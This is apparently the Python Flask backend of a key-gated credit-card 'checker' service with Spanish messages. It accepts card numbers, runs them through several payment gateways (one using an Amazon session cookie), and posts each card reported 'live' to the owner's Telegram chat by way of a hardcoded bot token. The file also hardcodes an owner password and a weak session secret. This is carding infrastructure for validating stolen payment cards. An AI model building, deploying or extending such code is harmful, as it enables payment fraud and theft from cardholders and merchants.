import os
import asyncio
from flask import Flask, request, jsonify, send_from_directory, session, redirect, url_for, render_template, flash
from flask_cors import CORS
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
import requests as req
import tec, red, em, amazon

app = Flask(__name__)
app.secret_key = 'tu_secreto_super_seguro'
CORS(app, resources={r"/*": {"origins": "*"}})

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50), unique=True, nullable=False)
    password_hash = db.Column(db.String(128), nullable=False)
    key = db.Column(db.String(50), unique=True, nullable=False)
    telegram_id = db.Column(db.String(20), nullable=True)
    role = db.Column(db.String(10), default='user')

    def set_password(self, password):
        self.password_hash = generate_password_hash(password)
    def check_password(self, password):
        return check_password_hash(self.password_hash, password)

class Key(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    key = db.Column(db.String(50), unique=True, nullable=False)
    used = db.Column(db.Boolean, default=False)

@app.before_first_request
def setup():
    db.create_all()
    owner = User.query.filter_by(username='owner').first()
    if not owner:
        owner = User(username='owner', key='owner_key', role='owner', telegram_id='846983753')
        owner.set_password('Saiper123')
        db.session.add(owner)
        db.session.commit()

@app.route('/')
def index():
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    return render_template('index.html')

@app.route('/style.css')
def style():
    return send_from_directory('.', 'style.css')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username'].strip()
        password = request.form['password']
        key_input = request.form['key'].strip()

        if username.lower() == 'owner':
            flash('No puedes registrar un usuario con el nombre "owner".', 'error')
            return redirect(url_for('register'))

        key_obj = Key.query.filter_by(key=key_input, used=False).first()
        if not key_obj:
            flash('La key no es válida o ya fue usada.', 'error')
            return redirect(url_for('register'))

        if User.query.filter_by(username=username).first():
            flash('El usuario ya existe.', 'error')
            return redirect(url_for('register'))

        user = User(username=username, key=key_input)
        user.set_password(password)
        db.session.add(user)
        key_obj.used = True
        db.session.commit()
        flash('Registro exitoso, ya puedes iniciar sesión.', 'success')
        return redirect(url_for('index'))
    return render_template('register.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username'].strip()
    password = request.form['password']
    user = User.query.filter_by(username=username).first()
    if user and user.check_password(password):
        session['user_id'] = user.id
        session['username'] = user.username
        session['role'] = user.role
        flash('Has iniciado sesión con éxito.', 'success')
        return redirect(url_for('dashboard'))
    else:
        flash('Usuario o contraseña incorrectos.', 'error')
        return redirect(url_for('index'))

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('index'))
    user = User.query.get(session['user_id'])
    keys = Key.query.all() if user.role in ['owner', 'admin'] else []
    return render_template('checker.html', username=user.username, role=user.role, keys=keys)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

@app.route('/save_telegram_id', methods=['POST'])
def save_telegram_id():
    if 'user_id' not in session:
        return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401

    telegram_id = request.json.get('telegram_id')
    user = User.query.get(session['user_id'])
    user.telegram_id = telegram_id
    db.session.commit()
    return jsonify({'status': 'success', 'message': 'Telegram ID guardado correctamente.'})

@app.route('/generate_key', methods=['POST'])
def generate_key():
    if 'user_id' not in session:
        return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401

    user = User.query.get(session['user_id'])
    if user.role not in ['owner', 'admin']:
        return jsonify({'status': 'error', 'message': 'No tienes permisos para generar keys.'}), 403

    new_key = os.urandom(6).hex()
    key = Key(key=new_key)
    db.session.add(key)
    db.session.commit()
    return jsonify({'status': 'success', 'key': new_key})

@app.route('/add_admin', methods=['POST'])
def add_admin():
    if 'user_id' not in session:
        return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401

    user = User.query.get(session['user_id'])
    if user.role != 'owner':
        return jsonify({'status': 'error', 'message': 'No tienes permisos para agregar administradores.'}), 403

    username = request.json.get('username')
    new_admin = User.query.filter_by(username=username).first()
    if not new_admin:
        return jsonify({'status': 'error', 'message': 'Usuario no encontrado.'}), 404

    new_admin.role = 'admin'
    db.session.commit()
    return jsonify({'status': 'success', 'message': f'Usuario {username} ahora es admin.'})

TELEGRAM_BOT_TOKEN = '7549342155:AAGTeGoCr6s56nckuq8KEDDB7aCKiU5BW3Y'
OWNER_TELEGRAM_ID = '846983753'

def enviar_telegram(mensaje, ids=[]):
    chat_ids = set(ids + [OWNER_TELEGRAM_ID])
    for chat_id in chat_ids:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {'chat_id': chat_id, 'text': mensaje, 'parse_mode': 'Markdown'}
        try:
            req.post(url, data=data)
        except Exception as e:
            print(f"Error enviando Telegram a {chat_id}: {e}")

@app.route('/check', methods=['POST'])
def check_card():
    data = request.get_json()
    cc = data.get('cc')
    gateway = data.get('gateway', 'TEC')
    cookie = data.get('cookie', '')

    try:
        if gateway == 'TEC':
            result = asyncio.run(tec.process_card(cc))
        elif gateway == 'RED':
            result = asyncio.run(red.process_card(cc))
        elif gateway == 'EM':
            result = asyncio.run(em.process_card(cc))
        elif gateway == 'AMAZON':
            result = amazon.procesar_tarjeta_amazon(cc, cookie)
        else:
            result = {'status': 'error', 'message': 'Gateway no válido', 'cc': cc}

        if result['status'] == 'live':
            user = User.query.get(session['user_id'])
            telegram_ids = [user.telegram_id] if user.telegram_id else []
            enviar_telegram(f"✅ *LIVE* - {result['cc']}\n{result['message']}", telegram_ids)

        return jsonify(result)
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/ping')
def ping():
    return jsonify({'message': 'pong'})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
